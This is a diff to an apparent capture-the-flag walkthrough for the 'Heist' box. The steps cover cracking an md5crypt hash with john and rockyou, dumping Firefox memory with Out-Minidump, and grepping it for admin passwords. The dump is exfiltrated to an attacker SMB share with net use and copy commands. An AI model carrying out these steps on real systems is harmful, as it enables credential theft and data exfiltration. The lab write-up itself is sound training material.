@@ -64,7 +64,7 @@ admin:$1$pdQG$o8nrSzsGXeaduXrjlvKc91
 ```
 And we use john with rockyou dictionary like :
 ```
-$ ~/MyGit/john/run/john   --wordlist=/home/roughiz/MyGit/wordlists/rockyou.txt hash
+$ john   --wordlist=rockyou.txt hash
 Warning: detected hash type "md5crypt", but the string is also recognized as "md5crypt-opencl"
 Use the "--format=md5crypt-opencl" option to force loading these as that type instead
 Using default input encoding: UTF-8
@@ -136,6 +136,7 @@ $ . .\PowerUp.ps1
 $ Out-Minidump -Process (Get-Process -Id 6156)  # id caught from ps 
 ```
 ![dump](https://github.com/roughiz/Heist-walktrough/blob/master/dump.png)
+
 And in my box, grep the file like: 
 ```
 $ strings firefox_6156.dmp  |  grep -Fi "password=" | grep -i "admin"
@@ -178,14 +179,14 @@ $ r:
 ```
 ![flagrootlocally](https://github.com/roughiz/Heist-walktrough/blob/master/flagrootlocally.png)
 ### Nota : 
-- My wirn ruby script dosen't work for this box , i tried an other simple script. (don't know why!!)
+- My winRm ruby script dosen't work for this box , i tried an other simple [script](https://alionder.net/winrm-shell/). (don't know why!!)
 
 - I used smbserver.py from Impacket to exfiltrate the dump.
 Firstly we have to launch the smb server with credentials like :
 ```
 $ sudo smbserver.py share $(pwd) -smb2support -username df -password df
 ```
-And in the windows box we first authenticate to the server like :
+And in the windows box we first authenticate to the server, and copy the file like :
 ```
 $ net use \\10.10.14.4\share /u:df df 
 $ copy mozilla_dump** \\10.10.14.4\share\
